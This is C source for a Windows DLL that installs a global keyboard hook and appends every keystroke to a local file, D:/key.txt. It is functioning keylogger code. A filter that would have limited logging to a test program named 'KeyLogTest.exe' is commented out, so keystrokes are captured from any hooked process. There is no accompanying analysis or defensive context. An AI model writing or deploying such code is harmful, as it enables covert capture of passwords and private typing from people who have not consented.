#define _CRT_SECURE_NO_WARNINGS

#include <windows.h>
#include <stdio.h>
__declspec(dllexport) HMODULE g_hMdl = NULL ;
__declspec(dllexport) HHOOK g_hHook = NULL;
#pragma comment(lib,"user32.lib")

FILE *fp = NULL;


BOOL WINAPI DllMain(HINSTANCE hinstDLL,  // handle to the DLL module
                    DWORD fdwReason,     // reason for calling function
                    LPVOID lpvReserved)   // reserved
{
    switch(fdwReason){
        case DLL_PROCESS_ATTACH:
            g_hMdl = hinstDLL;
            break ;
        case DLL_PROCESS_DETACH:
            break;
    }
    return 1;
}

__declspec(dllexport) LRESULT WINAPI MyHook(int code, WPARAM wParam, LPARAM lParam){
    char strBuf[MAX_PATH] = {0};
    char *p = NULL;
    if(code >= 0){
        if(!(lParam & 0x80000000)){
            GetModuleFileName(NULL, (LPWSTR)strBuf, sizeof(strBuf));
            p = strrchr(strBuf , '\\');
            // if (!_stricmp("KeyLogTest.exe", p+1)){
                fp = fopen("D:/key.txt", "a+");
                if(GetKeyState (VK_SHIFT) > 0){ //shift键盘没按下
                    if( wParam >= 'A' && wParam <= 'Z')
                        wParam += 32;
                }
                fputc(wParam,fp);
                fclose(fp);
                return CallNextHookEx(g_hHook, code, wParam, lParam);
            // }
        }
    }

    return CallNextHookEx(g_hHook, code, wParam, lParam);
}

